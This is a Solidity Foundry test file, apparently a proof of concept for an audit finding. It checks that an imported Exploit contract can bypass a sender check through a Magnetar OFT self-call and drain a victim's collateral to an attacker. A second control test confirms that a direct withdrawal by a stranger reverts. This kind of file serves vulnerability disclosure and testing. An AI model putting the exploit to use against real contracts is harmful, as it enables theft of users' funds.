// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./32317-h-06-attacker-can-use-magnetaractionoft-action-of-the-magnet.sol";

contract MagnetarOftSelfCallTest is Test {
    function test_oft_self_call_bypasses_checkSender_and_steals() public {
        Exploit exp = new Exploit();
        exp.run();

        assertEq(exp.market().collateral(exp.VICTIM()), 0, "victim drained");
        assertEq(exp.token().balanceOf(exp.ATTACKER()), exp.COLLATERAL(), "attacker profit");
    }

    function test_control_direct_withdraw_as_stranger_reverts() public {
        Cluster cluster = new Cluster();
        MockERC20 token = new MockERC20();
        Market market = new Market(token);
        Magnetar magnetar = new Magnetar(cluster, market, token);
        // Magnetar NOT whitelisted for this control; stranger cannot act for victim.
        market.seed(address(0x5151), 10 ether);
        market.setAllowance(address(0x5151), address(magnetar), type(uint256).max);
        market.approveMagnetar(address(magnetar));

        vm.expectRevert(bytes("Magnetar_NotAuthorized"));
        magnetar.withdrawCollateral(address(0x5151), address(this), 10 ether);
    }
}
